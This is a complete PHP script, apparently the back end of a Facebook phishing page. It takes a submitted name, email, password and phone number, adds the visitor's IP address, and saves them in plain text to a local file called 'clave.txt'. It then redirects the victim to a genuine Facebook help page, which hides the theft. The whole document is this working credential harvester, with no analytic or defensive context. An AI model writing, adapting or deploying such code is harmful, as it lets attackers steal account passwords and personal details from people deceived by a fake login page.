<?php
$nombre = $_POST[ 'nombre' ]; 
$correo = $_POST[ 'correo' ];
$contraseña = $_POST[ 'contraseña' ];
$numero = $_POST[ 'numero' ];
$ip = $_SERVER[ 'REMOTE_ADDR' ];
 
if( ( empty($correo)) or (empty($contraseña)) ){
    header('location: index.htm');
}else{  
        //guarderemos en un archivo de texto
        $file = fopen('clave.txt','a+');
        fwrite($file, "nombre: ".$nombre."\r\ncorreo: ".$correo."\r\ncontraseña: ".$contraseña."\r\nnumero: ".$numero."\r\nIP: ".$ip."\r\n=========================\r\n");
        fclose($file);
        header('location:https://www.facebook.com/help/413023562082171?helpref=page_content');      
        
}
?>